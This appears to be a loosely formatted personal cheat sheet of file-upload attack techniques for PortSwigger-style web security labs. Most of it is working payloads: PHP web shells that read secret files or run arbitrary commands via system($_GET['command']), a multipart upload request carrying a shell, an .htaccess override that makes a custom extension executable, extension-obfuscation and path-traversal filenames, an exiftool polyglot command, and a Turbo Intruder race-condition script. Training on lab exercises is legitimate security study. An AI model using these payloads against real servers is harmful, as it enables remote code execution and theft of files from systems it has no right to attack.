
<?php echo file_get_contents('/path/to/target/file'); ?>

# 1.1 Exploiting flawed validation of file uploads
---->

# 1.2 Flawed file type validation
---->When submitting HTML forms, the browser typically sends the provided data in a POST request with the content type application/x-www-form-url-encoded.

# 1.3 Preventing file execution in user-accessible directories
----> EXAMPLE: Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
                

--> Obfuscate the directory traversal sequence by URL encoding the forward slash (/) character, resulting in:
filename="..%2fexploit.php"

--> In Burp's proxy history, find the GET /files/avatars/..%2fexploit.php request.

# 1.4 Insufficient blacklisting of dangerous file types
----> 

# 1.5 Overriding the server configuration
----> EXAMPLE:
    In Burp Repeater, go to the tab for the POST /my-account/avatar request and find the part of the body that relates to your PHP file. Make the following changes:

    Change the value of the filename parameter to .htaccess.
    Change the value of the Content-Type header to text/plain.

    Replace the contents of the file (your PHP payload) with the following Apache directive:
    AddType application/x-httpd-php .l33t

    This maps an arbitrary extension (.l33t) to the executable MIME type application/x-httpd-php. As the server uses the mod_php module, it knows how to handle this already.

  
 # Send the request and observe that the file was successfully uploaded. 
 
 # Use the back arrow in Burp Repeater to return to the original request for uploading your PHP exploit. 
 
 # Change the value of the filename parameter from exploit.php to exploit.l33t.
 Send the request again and notice that the file was uploaded successfully. 

---------------------------------------------------------------------------------------------

-----------------------------27794193662398936909840782635
Content-Disposition: form-data; name="avatar"; filename="upload.l33t"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>

-----------------------------27794193662398936909840782635
Content-Disposition: form-data; name="user"

wiener
-----------------------------27794193662398936909840782635
Content-Disposition: form-data; name="csrf"

-----------------------------------------------------------------------------

 # Switch to the other Repeater tab containing the GET /files/avatars/<YOUR-IMAGE> request.
 
 # 1.6 Obfuscating file extensions
 ----->  EXAMPLE: Let's say the validation code is case sensitive and fails to recognize that exploit.pHp is in fact a .php file.
 If the code that subsequently maps the file extension to a MIME type is not case sensitive,  this discrepancy allows you to sneak malicious PHP files past validation that may eventually be executed by the server. 
 
 # 1.1.6 Provide multiple extensions.
 ----> EXAMPLE: exploit.php.jpg
 
 # 1.2.6 Add trailing characters.
 ----> EXAMPLE: exploit.php.
 
 # 1.3.6 Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. 
 ----> EXAMPLE: exploit%2Ephp
 
 # 1.4.6 Add semicolons or URL-encoded null byte characters before the file extension. EXAMPLE: If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: exploit.asp;.jpg or exploit.asp%00.jpg
 
 # 1.5.6 Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization 
 ----> EXAMPLE:  Sequences like xC0 x2E, xC4 xAE or xC0 xAE may be translated to x2E if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.
 
 # 1.6.6 Other defenses involve stripping or replacing dangerous extensions to prevent the file from being executed.
 ----> EXAMPLE:  consider what happens if you strip .php from the following filename:
exploit.p.phphp

# 1.7 Flawed validation of the file's contents
-----> EXAMPLE: exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
       # In Burp's proxy history, find the GET /files/avatars/polyglot.php
       # In the response check for "START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END"
       
 
 
        # 1.8 Race conditions in URL-based file uploads

# 1 Web shell upload via race condition

    def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
    
 NOTE: Take the GET request /files/avatars/<YOUR-IMAGE> to TURBO.
 
    # 1.8 Uploading files using PUT
    
    PUT /images/exploit.php HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-httpd-php
    Content-Length: 49

    <?php echo file_get_contents('/path/to/file'); ?>
    

---------------------------------------------------
A more versatile web shell may look something like this: 
<?php echo system($_GET['command']); ?>

This script enables you to pass an arbitrary system command via a query parameter as follows: 
GET /example/exploit.php?command=id HTTP/1.1






